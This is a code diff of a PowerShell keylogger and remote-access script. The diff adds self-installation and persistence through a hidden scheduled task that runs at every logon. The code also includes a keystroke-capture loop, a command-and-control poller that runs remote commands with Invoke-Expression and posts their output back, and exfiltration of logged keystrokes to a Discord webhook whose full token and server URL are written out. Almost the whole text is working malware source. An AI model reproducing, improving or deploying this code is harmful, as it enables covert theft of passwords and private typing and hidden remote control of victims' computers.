@@ -1,13 +1,27 @@
-# 1. Core Target Variables
+# ================= 1. SELF-INSTALLATION & PERSISTENCE LAYER =================
+$dir = "$env:LOCALAPPDATA\WinMedia"
+if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
+
+$localScript = "$dir\winlog.ps1"
+$logFile     = "$dir\data.txt"
+
+# If the script is running from temporary internet memory, drop it to disk and schedule it
+if ($MyInvocation.MyCommand.Name -ne "winlog.ps1") {
+    # Download its own full body and save it locally
+    $rawPayload = (New-Object System.Net.WebClient).DownloadString('https://githubusercontent.com')
+    Set-Content -Path $localScript -Value $rawPayload -Force
+
+    # Schedule the local file to run silently on every user login
+    schtasks /create /f /tn "WinMediaLog" /tr "powershell.exe -w h -ep bypass -File `"$localScript`"" /sc onlogon
+    schtasks /run /tn "WinMediaLog"
+    exit
+}
+
+# ================= 2. THE MAIN KEYLOGGER & C2 CORE =================
 $PCName     = "chase"
 $WebhookUrl = "https://discord.com/api/webhooks/1505177594226540655/BZPbc_W_oqVyfZEM0B5crFb3v3C03lgFeAU9DcdGrzUUCm_JbqsKoA8gIJMm4nlGDoxr"
 $C2Url      = "https://chase-4ebb.onrender.com"
-$dir        = "$env:LOCALAPPDATA\WinMedia"
 
-if (!(Test-Path $dir)) { New-Item $dir -Type Directory | Out-Null }
-$logFile = "$dir\data.txt"
-
-# 2. Stable Native Compilation Window
 $Source = @'
 using System;
 using System.Runtime.InteropServices;
@@ -23,11 +37,9 @@ $discordInterval = 0
 $headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
 
 while ($true) {
-    # ================= ENGINE A: HIGH-SPEED CHAR-MAPPED KEYLOGGER =================
+    # ENGINE A: CHAR-MAPPED KEYLOGGER
     $isShift = (([KeyEngine]::GetAsyncKeyState(16) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(160) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(161) -band 0x8000))
     $isCtrl  = (([KeyEngine]::GetAsyncKeyState(17) -band 0x8000) -or ([KeyEngine]::GetAsyncKeyState(162) -band 0x8000))
-    
-    # FIXED: Uses direct native GetKeyState bitwise mapping to read the true toggle state
     $isCaps  = (([KeyEngine]::GetKeyState(20) -band 1) -eq 1)
 
     for ($i = 8; $i -le 190; $i++) {
@@ -83,14 +95,13 @@ while ($true) {
         }
     }
 
-    # ================= ENGINE B: REMOTE COMMAND REMOTE AGENT POLLING =================
+    # ENGINE B: REMOTE AGENT C2 POLLING
     if ($c2Interval -ge 1000) {
         try {
             $cmdResponse = Invoke-RestMethod -Uri "${C2Url}/get_cmd?id=${PCName}" -Method Get -Headers $headers -TimeoutSec 5
             if ($cmdResponse -and $cmdResponse -ne 'wait') {
                 $output = (Invoke-Expression $cmdResponse 2>&1 | Out-String)
                 if (!$output) { $output = 'Command executed with no return data.' }
-                
                 $postUrl = "${C2Url}/send_res?id=${PCName}"
                 Invoke-RestMethod -Uri $postUrl -Method Post -Body $output -ContentType "text/plain" -Headers $headers -TimeoutSec 5 | Out-Null
             }
@@ -98,7 +109,7 @@ while ($true) {
         $c2Interval = 0
     }
 
-    # ================= ENGINE C: DISCORD EXFILTRATION CHANNEL =================
+    # ENGINE C: DISCORD EXFILTRATION CHANNEL
     if ($discordInterval -ge 12000) {
         if (Test-Path $logFile) {
             if ((Get-Item $logFile).Length -gt 0) {
@@ -113,7 +124,7 @@ while ($true) {
         $discordInterval = 0
     }
 
-    Start-Sleep -m 1
-    $c2Interval += 1
-    $discordInterval += 1
+    Start-Sleep -m 2
+    $c2Interval += 2
+    $discordInterval += 2
 }
